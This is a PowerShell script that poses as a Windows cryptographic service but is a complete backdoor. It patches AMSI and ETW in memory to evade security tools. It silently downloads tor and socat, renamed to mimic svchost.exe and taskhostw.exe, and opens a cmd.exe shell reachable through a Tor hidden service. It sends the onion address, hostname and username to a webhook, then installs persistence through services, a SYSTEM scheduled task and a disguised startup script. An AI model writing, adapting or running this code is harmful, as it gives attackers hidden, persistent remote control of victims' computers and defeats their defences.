# Windows Cryptographic Service Enhancement - COMPLETELY SILENT PERSISTENT VERSION
function Invoke-SecureCryptoService {
    # Enhanced AMSI/ETW Bypass with immediate window hiding
    function Initialize-SecurityContext {
        $bypassScript = @"
using System;using System.Runtime.InteropServices;
namespace Microsoft.Windows.Security {
    public class DefenseManager {
        [DllImport("kernel32")]static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32")]static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32")]static extern IntPtr GetModuleHandle(string lpModuleName);
        [DllImport("kernel32")]static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
        [DllImport("kernel32")]static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll")]static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
        
        public static void BypassSecurity() {
            try {
                // Hide console window immediately and permanently
                IntPtr hConsole = GetConsoleWindow();
                if (hConsole != IntPtr.Zero) {
                    ShowWindow(hConsole, 0); // SW_HIDE
                    SetWindowPos(hConsole, IntPtr.Zero, -10000, -10000, 0, 0, 0x0080); // Move off-screen
                }
                
                IntPtr hAmsi = GetModuleHandle("amsi.dll");
                if (hAmsi != IntPtr.Zero) {
                    IntPtr asb = GetProcAddress(hAmsi, "AmsiScanBuffer");
                    if (asb != IntPtr.Zero) {
                        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                        uint oldProtect;
                        VirtualProtect(asb, (uint)patch.Length, 0x40, out oldProtect);
                        Marshal.Copy(patch, 0, asb, patch.Length);
                        VirtualProtect(asb, (uint)patch.Length, oldProtect, out oldProtect);
                    }
                }
                IntPtr hNtdll = GetModuleHandle("ntdll.dll");
                if (hNtdll != IntPtr.Zero) {
                    IntPtr etwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
                    if (etwEventWrite != IntPtr.Zero) {
                        byte[] ret = { 0xC3 };
                        uint oldProtect;
                        VirtualProtect(etwEventWrite, (uint)ret.Length, 0x40, out oldProtect);
                        Marshal.Copy(ret, 0, etwEventWrite, ret.Length);
                        VirtualProtect(etwEventWrite, (uint)ret.Length, oldProtect, out oldProtect);
                    }
                }
            } catch { }
        }
    }
}
"@
        try { Add-Type -TypeDefinition $bypassScript -Language CSharp; [Microsoft.Windows.Security.DefenseManager]::BypassSecurity() } catch { }
    }

    # Enhanced Window Hiding with multiple methods
    function Hide-PowerShellWindow {
        Add-Type -Name Window -Namespace Console -MemberDefinition @"
[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();
[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
[DllImport("user32.dll")]public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
"@
        $consolePtr = [Console.Window]::GetConsoleWindow()
        if ($consolePtr -ne [IntPtr]::Zero) {
            [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
            [Console.Window]::SetWindowPos($consolePtr, [IntPtr]::Zero, -10000, -10000, 0, 0, 0x0080) | Out-Null
        }
    }

    # Completely silent download function
    function Get-NetworkComponents {
        $targetPath = "$env:USERPROFILE\AppData\Local\Microsoft\NET Framework\v4.0.30319\"
        New-Item -ItemType Directory -Path $targetPath -Force | Out-Null
        
        $githubBase = "https://github.com/randomnumber1212/XukuoopsyYYmsh/raw/main"
        
        # Mapping: original names -> new names
        $fileMappings = @{
            "msys-2.0.dll" = "win_core.dll"
            "msys-crypto-1.0.0.dll" = "win_crypto.dll" 
            "msys-ncursesw6.dll" = "win_term.dll"
            "msys-readline7.dll" = "win_read.dll"
            "msys-ssl-1.0.0.dll" = "win_ssl.dll"
            "msys-z.dll" = "win_compress.dll"
            "socat.exe" = "svchost.exe"
            "tor.exe" = "taskhostw.exe"
        }
        
        foreach ($originalFile in $fileMappings.Keys) {
            $newFileName = $fileMappings[$originalFile]
            $localPath = Join-Path $targetPath $newFileName
            
            if (-not (Test-Path $localPath)) {
                try {
                    # Completely silent download with no progress
                    $webClient = New-Object System.Net.WebClient
                    $webClient.Headers.Add('User-Agent', 'Microsoft-CryptoAPI')
                    $webClient.DownloadFile("$githubBase/$originalFile", $localPath)
                    $webClient.Dispose()
                    Start-Sleep -Milliseconds 500
                } catch { }
            }
        }
        return $targetPath
    }

    # Simple config functions
    function Save-Config {
        param($Config, $FilePath)
        $content = ""
        foreach ($key in $Config.Keys) {
            $content += "$key=$($Config[$key])`n"
        }
        $content | Out-File -FilePath $FilePath -Encoding ASCII
    }

    function Read-Config {
        param($FilePath)
        $config = @{}
        if (Test-Path $FilePath) {
            Get-Content $FilePath | ForEach-Object {
                if ($_ -match "^(.*?)=(.*)$") {
                    $config[$matches[1]] = $matches[2]
                }
            }
        }
        return $config
    }

    # Webhook POST function
    function Send-ToWebhook {
        param($OnionAddress, $Port)
        
        $webhookUrl = "https://webhook.site/336285c8-aadf-4cb2-b000-c6ac8fc20d21"
        $payload = @{
            onion_address = $OnionAddress
            port = $Port
            timestamp = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
            hostname = $env:COMPUTERNAME
            user = $env:USERNAME
        } | ConvertTo-Json -Compress
        
        try {
            $webClient = New-Object System.Net.WebClient
            $webClient.Headers.Add('Content-Type', 'application/json')
            $webClient.UploadString($webhookUrl, 'POST', $payload)
            $webClient.Dispose()
        } catch {
            # Silent fail on webhook error
        }
    }

    # Enhanced Window Hiding Helper for External Processes
    function Start-HiddenProcess {
        param($FilePath, $Arguments, $WorkingDirectory)
        
        try {
            $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
            $processStartInfo.FileName = $FilePath
            $processStartInfo.Arguments = $Arguments
            $processStartInfo.WorkingDirectory = $WorkingDirectory
            $processStartInfo.WindowStyle = [System.Diagnostics.ProcessWindowStyle]::Hidden
            $processStartInfo.CreateNoWindow = $true
            $processStartInfo.UseShellExecute = $false
            $processStartInfo.RedirectStandardOutput = $true
            $processStartInfo.RedirectStandardError = $true
            
            $process = New-Object System.Diagnostics.Process
            $process.StartInfo = $processStartInfo
            $process.Start() | Out-Null
            return $process
        } catch {
            return $null
        }
    }

    # Use persistent configuration with fixed port and preserved hidden service
    function Initialize-PersistentTorService {
        param($BasePath)
        
        $hiddenServiceDir = Join-Path $BasePath "hidden_service"
        $configFile = Join-Path $BasePath "persistent_config.txt"
        
        # Fixed port - will never change
        $fixedPort = 64152
        
        # Check if we already have a configuration
        $config = Read-Config -FilePath $configFile
        if ($config.ContainsKey("Port")) {
            $fixedPort = [int]$config.Port
        } else {
            # Create new configuration
            $config = @{ Port = $fixedPort }
            Save-Config -Config $config -FilePath $configFile
        }
        
        # Ensure hidden service directory exists and preserve it
        New-Item -ItemType Directory -Path $hiddenServiceDir -Force | Out-Null
        
        # Create torrc with fixed configuration
        $torrcPath = Join-Path $BasePath "torrc"
        $torConfig = @"
SOCKSPort 9050
ControlPort 9051
HiddenServiceDir $hiddenServiceDir
HiddenServicePort $fixedPort 127.0.0.1:$fixedPort
DataDirectory $BasePath\Data
Log notice file $BasePath\tor.log
"@
        $torConfig | Out-File -FilePath $torrcPath -Encoding ASCII -Force
        
        return @{ 
            TorrcPath = $torrcPath
            HiddenServiceDir = $hiddenServiceDir 
            Port = $fixedPort
            ConfigFile = $configFile
        }
    }

    # Get or create persistent Onion address
    function Get-PersistentOnionAddress {
        param($HiddenServiceDir, $ConfigFile)
        
        $hostnamePath = Join-Path $HiddenServiceDir "hostname"
        $maxAttempts = 90
        $attempt = 0
        
        # Read existing config
        $config = Read-Config -FilePath $ConfigFile
        
        # Check if we already have a saved onion address
        if ($config.OnionAddress -and $config.OnionAddress -ne "") {
            return $config.OnionAddress
        }
        
        # Wait for Tor to generate new onion address
        while ($attempt -lt $maxAttempts) {
            if (Test-Path $hostnamePath) {
                try {
                    $onionAddress = Get-Content $hostnamePath -Raw -ErrorAction SilentlyContinue
                    if ($onionAddress -and $onionAddress.Trim().Length -gt 0) {
                        # Save the onion address permanently
                        $config.OnionAddress = $onionAddress.Trim()
                        Save-Config -Config $config -FilePath $ConfigFile
                        return $onionAddress.Trim()
                    }
                } catch { }
            }
            Start-Sleep -Seconds 2
            $attempt++
        }
        return $null
    }

    # FIXED: Reliable Tor startup function
    function Start-TorService {
        param($BasePath, $TorrcPath)
        
        try {
            # Kill any existing Tor processes
            Get-Process -Name "taskhostw" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            
            # FIXED: Use Start-Process directly for better reliability
            $torProcess = Start-Process -FilePath (Join-Path $BasePath "taskhostw.exe") -ArgumentList "-f `"$TorrcPath`"" -WorkingDirectory $BasePath -WindowStyle Hidden -PassThru
            
            # Wait a bit for process to initialize
            Start-Sleep -Seconds 5
            
            return $torProcess
        } catch {
            return $null
        }
    }

    # FIXED: Enhanced Socat startup
    function Start-SocatService {
        param($BasePath, $Port)
        
        try {
            # Kill any existing Socat processes
            Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
            Start-Sleep -Seconds 2
            
            # FIXED: Use Start-Process directly for better reliability
            $socatProcess = Start-Process -FilePath (Join-Path $BasePath "svchost.exe") -ArgumentList "TCP-LISTEN:$Port,reuseaddr,fork,keepalive EXEC:cmd.exe,pty,stderr" -WorkingDirectory $BasePath -WindowStyle Hidden -PassThru
            
            return $socatProcess
        } catch {
            return $null
        }
    }

    # FIXED: GUARANTEED PERSISTENCE - TOR STARTS ON REBOOT AUTOMATICALLY
    function Create-ReliablePersistence {
        param($BasePath, $Port, $ConfigFile)
        
        # METHOD 1: Windows Service - MOST RELIABLE (No windows, auto-start)
        try {
            $torServiceName = "WindowsCryptographicService"
            
            # Delete existing Tor service if it exists
            try {
                $existingService = Get-Service -Name $torServiceName -ErrorAction SilentlyContinue
                if ($existingService) {
                    Stop-Service -Name $torServiceName -Force -ErrorAction SilentlyContinue
                    Start-Sleep -Seconds 2
                    sc.exe delete $torServiceName | Out-Null
                    Start-Sleep -Seconds 2
                }
            } catch { }
            
            # Create Windows service for Tor (completely hidden, no windows)
            $torBinPath = "`"$BasePath\taskhostw.exe`" -f `"$BasePath\torrc`""
            sc.exe create $torServiceName binPath= "$torBinPath" DisplayName= "Windows Cryptographic Service" start= "auto" | Out-Null
            sc.exe description $torServiceName "Provides cryptographic services for Windows applications" | Out-Null
            
            # Start the Tor service immediately
            Start-Sleep -Seconds 3
            Start-Service -Name $torServiceName -ErrorAction SilentlyContinue
            
        } catch { }

        # METHOD 2: Windows Service for Socat
        try {
            $socatServiceName = "NetworkCryptoService"
            
            # Delete existing Socat service if it exists
            try {
                $existingSocatService = Get-Service -Name $socatServiceName -ErrorAction SilentlyContinue
                if ($existingSocatService) {
                    Stop-Service -Name $socatServiceName -Force -ErrorAction SilentlyContinue
                    Start-Sleep -Seconds 2
                    sc.exe delete $socatServiceName | Out-Null
                    Start-Sleep -Seconds 2
                }
            } catch { }
            
            # Create Windows service for Socat
            $socatBinPath = "`"$BasePath\svchost.exe`" TCP-LISTEN:$Port,reuseaddr,fork,keepalive EXEC:cmd.exe,pty,stderr"
            sc.exe create $socatServiceName binPath= "$socatBinPath" DisplayName= "Network Cryptographic Service" start= "auto" | Out-Null
            sc.exe description $socatServiceName "Provides network cryptographic services" | Out-Null
            
            # Start Socat service after delay (when Tor is ready)
            Start-Sleep -Seconds 35
            Start-Service -Name $socatServiceName -ErrorAction SilentlyContinue
            
        } catch { }

        # METHOD 3: Scheduled Task as Backup (Completely Hidden)
        try {
            $taskName = "MicrosoftCryptoService"
            
            # Delete existing task
            schtasks /delete /tn $taskName /f 2>$null
            
            # Create batch file that starts both Tor and Socat
            $batchContent = @"
@echo off
cd /d "$BasePath"
start /B taskhostw.exe -f "$BasePath\torrc"
timeout /t 30 >nul
start /B svchost.exe TCP-LISTEN:$Port,reuseaddr,fork,keepalive EXEC:cmd.exe,pty,stderr
"@
            $batchPath = Join-Path $BasePath "startup_runner.bat"
            $batchContent | Out-File -FilePath $batchPath -Encoding ASCII -Force
            
            # Create scheduled task that runs on system startup
            schtasks /create /tn $taskName /tr "cmd.exe /c `"$batchPath`"" /sc onstart /ru SYSTEM /f 2>$null
            
        } catch { }

        # METHOD 4: Registry Persistence as Final Backup
        try {
            $startupPath = [Environment]::GetFolderPath('Startup')
            
            # Create VBS script for registry persistence
            $vbsContent = @"
Set WshShell = CreateObject("WScript.Shell")
WshShell.CurrentDirectory = "$BasePath"
WshShell.Run "cmd.exe /c start /B taskhostw.exe -f ""$BasePath\torrc""", 0, False
WScript.Sleep 30000
WshShell.Run "cmd.exe /c start /B svchost.exe TCP-LISTEN:$Port,reuseaddr,fork,keepalive EXEC:cmd.exe,pty,stderr", 0, False
"@
            $vbsPath = Join-Path $startupPath "WindowsUpdate.vbs"
            $vbsContent | Out-File -FilePath $vbsPath -Encoding ASCII -Force
            
        } catch { }

        return $true
    }

    # FIXED: Enhanced Tor readiness check
    function Wait-ForTorReady {
        param($BasePath, $MaxWaitSeconds = 120)
        
        $startTime = Get-Date
        while (((Get-Date) - $startTime).TotalSeconds -lt $MaxWaitSeconds) {
            try {
                # Check if Tor process is running and hostname file exists
                $torProcess = Get-Process -Name "taskhostw" -ErrorAction SilentlyContinue
                $hostnamePath = Join-Path (Join-Path $BasePath "hidden_service") "hostname"
                
                if ($torProcess -and (Test-Path $hostnamePath)) {
                    return $true
                }
            } catch { }
            Start-Sleep -Seconds 3
        }
        return $false
    }

    # Main Execution - COMPLETELY SILENT
    try {
        # Hide window immediately
        Hide-PowerShellWindow
        Initialize-SecurityContext
        
        # Download components
        $basePath = Get-NetworkComponents
        
        # Configure Tor hidden service
        $serviceInfo = Initialize-PersistentTorService -BasePath $basePath
        
        # Kill any existing processes
        Get-Process -Name "taskhostw" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Get-Process -Name "svchost" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
        Start-Sleep -Seconds 3
        
        # Start Tor service
        $torProcess = Start-TorService -BasePath $basePath -TorrcPath $serviceInfo.TorrcPath
        
        if ($torProcess) {
            # Wait for Tor to be ready
            $torReady = Wait-ForTorReady -BasePath $basePath
            
            if ($torReady) {
                # Get Onion address
                $onionAddress = Get-PersistentOnionAddress -HiddenServiceDir $serviceInfo.HiddenServiceDir -ConfigFile $serviceInfo.ConfigFile
                
                if ($onionAddress) {
                    # Start Socat service
                    $socatProcess = Start-SocatService -BasePath $basePath -Port $serviceInfo.Port
                    
                    if ($socatProcess) {
                        # Send data to webhook
                        Send-ToWebhook -OnionAddress $onionAddress -Port $serviceInfo.Port
                        
                        # Apply GUARANTEED persistence methods
                        Create-ReliablePersistence -BasePath $basePath -Port $serviceInfo.Port -ConfigFile $serviceInfo.ConfigFile | Out-Null
                        
                        # Save connection info
                        $connectionInfo = "Persistent Connection Information:
Onion Address: $onionAddress
Port: $($serviceInfo.Port)

Persistence Methods Applied:
- Windows Service: WindowsCryptographicService (Tor)
- Windows Service: NetworkCryptoService (Socat) 
- Scheduled Task: MicrosoftCryptoService
- Startup Registry: WindowsUpdate.vbs

Services will auto-start on system reboot.
Tor (taskhostw.exe) runs completely hidden in background.
Socat (svchost.exe) starts with listener after Tor is ready.

Access command: socat STDIO TCP4:$onionAddress`:$($serviceInfo.Port)"
                        
                        $connectionInfo | Out-File -FilePath (Join-Path $basePath "persistent_connection_info.txt") -Encoding ASCII -Force
                    }
                }
            }
        }
        
        # Keep the script running briefly
        Start-Sleep -Seconds 15
    } catch { 
        # Complete silence on errors
    }
}

# Execute completely silently
Invoke-SecureCryptoService